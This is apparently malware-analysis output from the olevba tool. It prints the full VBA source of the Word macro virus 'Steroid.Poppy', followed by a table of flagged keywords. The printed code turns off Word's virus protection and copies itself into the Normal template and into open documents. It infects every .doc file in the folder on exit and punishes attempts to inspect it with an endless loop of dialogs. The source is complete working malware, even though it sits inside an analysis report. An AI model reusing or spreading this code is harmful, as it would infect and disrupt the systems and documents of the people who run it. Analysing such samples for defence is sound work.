olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Steroid.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Steroid.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Injekt.bas 
in file: Virus.MSWord.Steroid.f - OLE stream: 'Macros/VBA/Injekt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function SetVolumeLabel Lib "kernel32" Alias "SetVolumeLabelA" (ByVal lpRootPathName As String, ByVal lpVolumeName As String) As Long
Sub Steroid()
    
    ' Steroid.Poppy.II by VicodinES
    ' "Whats Up" to : Slage Hammer, Spanska and the entire _Kim_Liberation_Army_

If Application.ShowVisualBasicEditor Then Call out
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next

With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
If Application.ShowVisualBasicEditor Then Call out
ActiveDocument.ReadOnlyRecommended = False
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
If Application.ShowVisualBasicEditor Then Call out
Application.VBE.ActiveVBProject.VBComponents("Injekt").Export "c:\startup.log"
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "Injekt" Then NormInstall = True
Next i
If Application.ShowVisualBasicEditor Then Call out
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Injekt" Then ActivInstall = True
Next i
If Application.ShowVisualBasicEditor Then Call out
If ActivInstall = False Then
With ActiveDocument.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
End If
If Application.ShowVisualBasicEditor Then Call out
If NormInstall = False Then
With NormalTemplate.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
volset = SetVolumeLabel("c:\", "Test")
End If
If Application.ShowVisualBasicEditor Then Call out
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
If NormalTemplate.Saved = False Then NormalTemplate.Save
End If
If Application.ShowVisualBasicEditor Then Call out
'VMPCK v2.0 Beta
Application.ScreenUpdating = True
If Application.ShowVisualBasicEditor Then Call out
fuckoff:
End Sub
Sub HelpAbout()
On Error Resume Next
MsgBox "Can I have a bottle of warm Diet Mountain Dew?", vbInformation, "VMPCK v2.0 Beta / SR-1 Compatable"
MsgBox "Shout Out! ...Slage Hammer, Spanska and the entire _Kim_Liberation_Army_", vbInformation, "W97M/Steroid.Poppy"
End Sub
Sub FileSave()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
Application.ScreenUpdating = False
ActiveDocument.Save
Application.ScreenUpdating = True
End Sub
Sub FileSaveAs()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
dialogs(wdDialogFileSaveAs).show
Application.ScreenUpdating = True
Call Steroid
End Sub
Sub FilePrint()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
dialogs(wdDialogFilePrint).show
Call Steroid
End Sub
Sub FileClose()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
Application.ScreenUpdating = False
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Caffeine
Application.Quit
End Sub
Sub AutoExit()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Caffeine
End Sub
Sub AutoClose()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
Call Steroid
End Sub
Sub ViewVBCode()
On Error Resume Next
If Application.ShowVisualBasicEditor Then Call out
End Sub
Sub Caffeine()
If Application.ShowVisualBasicEditor Then Call out
Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
Fname = Dir(pName & "*.doc", sAttr)
If (Fname <> "") And ((Fname <> ".") And (Fname <> "..")) Then InfectDOC = pName & Fname
Documents.Open FileName:=InfectDOC, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Do While (Fname <> "")
Fname = Dir()
If (Fname <> "") And _
((Fname <> ".") And (Fname <> "..")) Then
InfectDOC = pName & Fname
Documents.Open FileName:=InfectDOC, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Call Steroid
End If
Loop
End Sub
Sub info()

    'The VicodinES Macro.Poppy Construction Kit v2.0 Beta
    '====================================================
    'Code Written by VicodinES-\VV/----------------------
    'Poppy ID : 75637833-270----\/---Compatable with SR-1
    'Steroid.Poppy.II-----------/\--Never Begins Tomorrow

End Sub
Sub out()
ShowVisualBasicEditor = False
randomize
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
ShowVisualBasicEditor = False
ActiveDocument.Save
NormalTemplate.Save
Call Caffeine
x = 1
Do While x = 1
testicle = Int(Rnd * 700)
dialogs(testicle).show
Loop
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Hex String|ucx3                |75637833                                     |
+----------+--------------------+---------------------------------------------+

